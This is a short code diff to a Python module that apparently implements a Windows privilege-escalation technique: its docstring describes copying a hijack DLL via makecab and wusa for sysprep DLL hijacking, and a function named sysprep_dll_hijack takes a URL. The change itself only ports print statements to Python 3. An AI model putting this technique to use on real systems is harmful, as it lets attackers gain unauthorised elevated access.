@@ -20,6 +20,7 @@ if fail, we attempt to use makecab and wusa to copy our dll. After
 the copy is done, we execute the executable and enjoys the elevated
 access
 """
+from __future__ import print_function
 import os
 import sys
 import requests
@@ -50,7 +51,7 @@ def sysprep_dll_hijack(url):
 						except Exception as error:
 							return False
 						try:
-							print os.remove("CRYPTBASE.tmp")
+							print(os.remove("CRYPTBASE.tmp"))
 						except Exception as error:
 							return False	
 						try:
